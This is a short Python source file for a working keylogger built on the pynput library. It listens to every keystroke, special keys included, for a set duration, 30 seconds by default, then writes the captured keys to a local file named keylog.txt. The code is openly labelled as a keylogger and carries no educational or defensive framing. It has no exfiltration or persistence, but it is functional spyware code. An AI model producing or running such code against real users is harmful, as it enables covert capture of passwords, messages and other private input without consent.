from pynput import keyboard
from threading import Timer

keys = []

def on_press(key):
    try:
        keys.append(key.char)
    except AttributeError:
        keys.append(f'[{key.name}]')

def write_keys_to_file(log_file="keylog.txt"):
    with open(log_file, "w", encoding="utf-8") as file:
        file.write("=== Keylogger Output ===\n")
        for key in keys:
            file.write(str(key))
    print(f"[+] Keystrokes saved to {log_file}")

def start_keylogger(duration=30, log_file="keylog.txt"):
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    def stop_listener():
        listener.stop()
        write_keys_to_file(log_file)

    # Stop after duration
    timer = Timer(duration, stop_listener)
    timer.start()

    listener.join()